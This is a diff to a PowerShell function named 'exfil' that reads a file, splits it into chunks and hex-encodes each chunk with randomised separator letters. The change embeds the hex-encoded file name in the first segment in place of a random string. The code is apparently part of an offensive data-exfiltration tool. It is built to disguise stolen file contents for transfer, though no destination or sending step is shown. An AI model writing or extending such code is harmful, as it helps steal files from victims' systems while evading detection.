@@ -13,6 +13,9 @@ function exfil {
 		)
 
 		try {
+			# Get the name of the file
+   			$fileName = Split-Path $filepath -Leaf
+  		
 			# Read the file as a byte array
 			$bytes = [System.IO.File]::ReadAllBytes($FilePath)
 
@@ -35,11 +38,11 @@ function exfil {
 			$hexObject = New-Object PSObject
 
 			# Generate a random hex string of 8-16 characters for the first segment
-			$randomHexForFirstSegment = -join ((0..15) | Get-Random -Count (Get-Random -Minimum 8 -Maximum 17) | ForEach-Object { "{0:X}" -f $_ })
+			$hexFileName = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($fileName)).Replace('-', '')
 
 			# Randomly select a separator for the total number of segments
 			$totalSeparator = 'H'
-			$hexObject | Add-Member -MemberType NoteProperty -Name 1 -Value ($chunks.Count.ToString() + $totalSeparator + $randomHexForFirstSegment)
+			$hexObject | Add-Member -MemberType NoteProperty -Name 1 -Value ($chunks.Count.ToString() + $totalSeparator + $hexFileName)
 
 			for ($i = 0; $i -lt $chunks.Count; $i++) {
 				# Randomly select a separator from G, H, I for each chunk
